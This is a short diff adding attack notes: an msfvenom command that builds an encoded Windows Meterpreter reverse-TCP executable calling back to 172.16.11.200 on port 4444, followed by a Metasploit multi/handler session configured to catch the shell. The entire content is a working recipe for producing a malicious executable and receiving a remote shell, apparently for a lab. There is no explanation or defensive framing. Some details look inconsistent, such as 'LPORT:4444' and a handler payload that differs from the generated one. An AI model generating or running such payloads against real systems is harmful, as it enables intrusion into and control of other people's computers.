@@ -1,0 +1,14 @@
+# create payload
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.11.200 LPORT:4444 -f exe -e cmd/powershell_base64 -o payload_base64.exe
+# 4444 port only
+
+# run
+msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set payload cmd/windows/powershell_reverse_tcp
+payload => cmd/windows/powershell_reverse_tcp
+msf6 exploit(multi/handler) > set LPORT 4444
+LPORT => 4444
+msf6 exploit(multi/handler) > set LHOST 172.16.11.200
+LHOST => 172.16.11.200
+msf6 exploit(multi/handler) > exploit
